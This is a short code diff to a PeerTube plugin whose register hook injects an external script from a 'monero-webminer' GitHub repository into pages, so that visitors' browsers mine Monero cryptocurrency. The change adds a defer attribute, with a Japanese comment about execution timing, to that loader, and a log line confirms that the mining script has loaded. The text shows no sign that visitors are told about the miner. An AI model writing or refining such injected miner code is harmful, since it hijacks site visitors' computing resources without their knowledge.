@@ -14,6 +14,7 @@ async function register({ registerHook, peertubeHelpers }) {
       const externalScript = document.createElement("script")
       externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
       externalScript.async = true // 非同期ロード
+      externalScript.defer = true // 実行タイミング調整
       externalScript.onload = () => {
         console.log("Mining script loaded successfully.")
         resolve()
